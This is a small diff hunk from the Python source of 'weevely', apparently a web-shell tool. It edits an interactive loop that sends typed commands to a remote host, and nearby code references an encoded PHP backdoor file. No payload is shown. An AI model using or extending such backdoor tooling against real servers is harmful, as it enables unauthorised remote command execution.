@@ -138,7 +138,7 @@ class weevely:
       print hostname + '> ',
       cmnd = sys.stdin.readline()
       if cmnd!='\n':
-	print self.host.execute(cmnd, 0)
+	print self.host.execute(cmnd)
 
   def generate(self,key,path):
     f_tocrypt = file('php/encoded_backdoor.php')
